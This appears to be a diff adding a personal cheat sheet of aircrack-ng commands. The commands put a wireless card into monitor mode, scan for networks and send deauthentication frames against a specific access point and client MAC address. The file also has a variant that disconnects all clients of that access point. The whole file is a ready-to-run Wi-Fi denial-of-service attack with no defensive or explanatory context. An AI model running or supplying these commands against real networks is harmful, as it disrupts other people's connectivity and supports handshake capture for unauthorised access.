@@ -1,0 +1,14 @@
+sudo airmon-ng start wlx000f00754698
+sudo airmon-ng check kill
+sudo airodump-ng wlan0mon
+sudo iwconfig wlan0mon channel 11
+sudo aireplay-ng -0 10 -a 68:FF:7B:3D:EE:76 -c 48:2C:A0:6B:05:34 wlan0mon
+
+
+
+
+
+
+TO DEAUTH ALL:
+sudo aireplay-ng -0 10 -a 68:FF:7B:3D:EE:76 wlan0mon 
+Like above but without -c (client)
